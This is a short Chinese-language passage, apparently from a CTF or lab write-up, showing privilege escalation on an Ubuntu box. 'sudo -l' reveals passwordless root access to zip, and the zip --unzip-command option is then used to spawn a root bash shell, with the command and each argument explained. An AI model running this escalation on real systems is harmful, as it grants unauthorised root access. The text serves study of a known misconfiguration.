su 直接切换账户，sudo -l 发现可以无密码 root 执行 /usr/bin/zip

zip 命令有一个 -T 参数，可以用于测试压缩包的完整性，并且可以通过 --unzip-command 选项执行任意命令。

merlin@ubuntu:/home/skyfuck$ sudo -l

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

提权成功

  • -T：测试压缩包的完整性
  • –unzip-command：指定解压时要执行的命令
  • /tmp/test.zip：任意 zip 文件名
  • /etc/hosts：任意要打包的文件
merlin@ubuntu:/home/skyfuck$ sudo zip -T --unzip-command="/bin/bash -c 'bash -i'" /tmp/test.zip /etc/hosts
